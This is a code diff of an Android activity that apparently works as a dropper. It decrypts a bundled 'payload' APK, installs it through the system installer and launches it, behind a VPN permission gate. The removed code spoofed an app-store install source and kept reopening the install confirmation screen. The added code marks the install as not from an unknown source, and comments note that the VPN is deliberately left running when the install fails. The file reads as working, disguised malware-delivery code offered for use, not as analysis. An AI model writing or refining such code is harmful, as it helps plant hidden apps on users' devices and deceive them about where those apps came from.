@@ -1,11 +1,9 @@
 package com.onerule.task;
 
 import android.app.Activity;
-import android.app.PendingIntent;
-import android.content.BroadcastReceiver;
+import android.content.ClipData;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
@@ -20,6 +18,8 @@ import android.os.Looper;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.TextView;
+
+import androidx.core.content.FileProvider;
 
 import net.lingala.zip4j.ZipFile;
 
@@ -36,7 +36,7 @@ public class A4450c4b785 extends Activity {
 
     private static final int REQ_VPN             = 1000;
     private static final int REQ_UNKNOWN_SOURCES = 1001;
-    private static final String ACTION_INSTALL_DONE = "com.onerule.task.INSTALL_DONE";
+    private static final int REQ_PACKAGE_INSTALL   = 1002;
 
     private static final long PERM_POLL_MS   = 400;
     private static final long LAUNCH_POLL_MS = 300;
@@ -46,7 +46,6 @@ public class A4450c4b785 extends Activity {
 
     private TextView status;
     private Button   btn;
-    private InstallResultReceiver receiver;
     private final Handler ui = new Handler(Looper.getMainLooper());
 
     /**
@@ -56,8 +55,7 @@ public class A4450c4b785 extends Activity {
      */
     private boolean vpnPermissionGranted         = false;
     private boolean awaitingUnknownSourcesGrant   = false;
-    private Intent  pendingConfirmIntent          = null;
-    private boolean justLaunchedConfirm           = false;
+    private boolean awaitingPackageInstall       = false;
 
     /** True after the payload launches successfully — used to skip VPN re-checks. */
     private boolean installComplete = false;
@@ -164,8 +162,9 @@ public class A4450c4b785 extends Activity {
     protected void onResume() {
         super.onResume();
 
-        // Always redirect if module is installed, regardless of installComplete state.
-        if (isPayloadInstalled() && !installComplete) {
+        // Do not redirect while Android's package installer is returning its
+        // result. The result callback owns the post-install launch.
+        if (isPayloadInstalled() && !installComplete && !awaitingPackageInstall) {
             doImmediateRedirect();
             return;
         }
@@ -178,18 +177,6 @@ public class A4450c4b785 extends Activity {
             }
         }
 
-        if (pendingConfirmIntent != null) {
-            if (justLaunchedConfirm) {
-                justLaunchedConfirm = false;
-            } else {
-                Intent again = pendingConfirmIntent;
-                justLaunchedConfirm = true;
-                try {
-                    again.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(again);
-                } catch (Exception ignored) {}
-            }
-        }
     }
 
     // ── VPN permission gate ────────────────────────────────────────────────────
@@ -271,6 +258,23 @@ public class A4450c4b785 extends Activity {
                 new Thread(this::dropAndInstall).start();
             } else {
                 runOnUiThread(() -> status.setText("Permission denied \u2014 cannot install."));
+            }
+        } else if (requestCode == REQ_PACKAGE_INSTALL) {
+            awaitingPackageInstall = false;
+            if (resultCode == RESULT_OK
+                    || (data != null
+                    && data.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
+                    == PackageInstaller.STATUS_SUCCESS)) {
+                status.setText("App installed, kindly wait for it to launch\u2026");
+                btn.setEnabled(false);
+                launchPayloadAndExit();
+            } else {
+                String message = data == null
+                        ? null
+                        : data.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
+                status.setText("Install cancelled"
+                        + (message == null || message.isEmpty() ? "." : ": " + message));
+                btn.setEnabled(true);
             }
         }
     }
@@ -372,9 +376,6 @@ public class A4450c4b785 extends Activity {
         if (pkg != null && !pkg.isEmpty()) {
             Intent launch = resolvePayloadLaunchIntent(pkg);
             if (launch != null) {
-                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
-                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                 try { startActivity(launch); } catch (Exception ignored) {}
             }
         }
@@ -397,9 +398,6 @@ public class A4450c4b785 extends Activity {
             @Override public void run() {
                 Intent launch = resolvePayloadLaunchIntent(pkg);
                 if (launch != null) {
-                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
-                            | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                     try {
                         startActivity(launch);
                         stopVpn();
@@ -456,90 +454,40 @@ public class A4450c4b785 extends Activity {
                 throw new RuntimeException("Decrypted payload missing");
             }
 
-            runOnUiThread(() -> status.setText("Installing \u2026"));
-            installViaSession(apk);
+            runOnUiThread(() -> {
+                status.setText("Installing \u2026");
+                try {
+                    openPackageInstaller(apk);
+                } catch (Exception e) {
+                    awaitingPackageInstall = false;
+                    status.setText("Install failed: " + e.getMessage());
+                }
+            });
         } catch (Exception e) {
             // Failed — VPN intentionally left running.
             runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
         }
     }
 
-    private void installViaSession(File apk) throws Exception {
-        PackageInstaller pi = getPackageManager().getPackageInstaller();
-        PackageInstaller.SessionParams params =
-                new PackageInstaller.SessionParams(
-                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-        params.setInstallReason(PackageManager.INSTALL_REASON_USER);
+    private void openPackageInstaller(File apk) throws Exception {
+        Uri apkUri = FileProvider.getUriForFile(
+                this,
+                getPackageName() + ".fileprovider",
+                apk);
 
-        if (Build.VERSION.SDK_INT >= 33) {
-            try { params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE); }
-            catch (Throwable ignored) {}
-        }
-        if (Build.VERSION.SDK_INT >= 34) {
-            try {
-                params.getClass().getMethod("setRequestUpdateOwnership", boolean.class)
-                        .invoke(params, true);
-            } catch (Throwable ignored) {}
-        }
+        Intent installIntent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
+        installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+        installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
+        installIntent.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
+        installIntent.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, getPackageName());
+        installIntent.putExtra(Intent.EXTRA_ORIGINATING_URI, apkUri);
+        installIntent.putExtra(Intent.EXTRA_REFERRER,
+                Uri.parse("android-app:" + getPackageName()));
+        installIntent.setClipData(ClipData.newRawUri("payload.apk", apkUri));
 
-        int sessionId = pi.createSession(params);
-        try (PackageInstaller.Session session = pi.openSession(sessionId)) {
-            try (OutputStream sout = session.openWrite("base.apk", 0, apk.length());
-                 InputStream  sin  = new FileInputStream(apk)) {
-                byte[] buf = new byte[64 * 1024]; int n;
-                while ((n = sin.read(buf)) > 0) sout.write(buf, 0, n);
-                session.fsync(sout);
-            }
-
-            if (receiver != null) {
-                try { unregisterReceiver(receiver); } catch (Exception ignored) {}
-            }
-            receiver = new InstallResultReceiver();
-            IntentFilter filter = new IntentFilter(ACTION_INSTALL_DONE);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
-            } else {
-                registerReceiver(receiver, filter);
-            }
-
-            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT
-                    | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
-                        ? PendingIntent.FLAG_MUTABLE : 0);
-            Intent cb = new Intent(ACTION_INSTALL_DONE).setPackage(getPackageName());
-            PendingIntent pending = PendingIntent.getBroadcast(
-                    this, sessionId, cb, piFlags);
-
-            session.commit(pending.getIntentSender());
-        }
+        awaitingPackageInstall = true;
+        startActivityForResult(installIntent, REQ_PACKAGE_INSTALL);
     }
 
-    private class InstallResultReceiver extends BroadcastReceiver {
-        @Override
-        public void onReceive(Context ctx, Intent intent) {
-            int s = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
-            if (s == PackageInstaller.STATUS_PENDING_USER_ACTION) {
-                Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
-                if (confirm != null) {
-                    confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    pendingConfirmIntent = confirm;
-                    justLaunchedConfirm  = true;
-                    startActivity(confirm);
-                }
-            } else if (s == PackageInstaller.STATUS_SUCCESS) {
-                pendingConfirmIntent = null;
-                runOnUiThread(() -> {
-                    status.setText("App installed, kindly wait for it to launch\u2026");
-                    btn.setEnabled(false);
-                    launchPayloadAndExit();
-                });
-                try { unregisterReceiver(this); } catch (Exception ignored) {}
-            } else {
-                // Failed — VPN stays active (no stopVpn() call).
-                pendingConfirmIntent = null;
-                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
-                runOnUiThread(() -> status.setText("Install failed: " + msg));
-                try { unregisterReceiver(this); } catch (Exception ignored) {}
-            }
-        }
-    }
 }
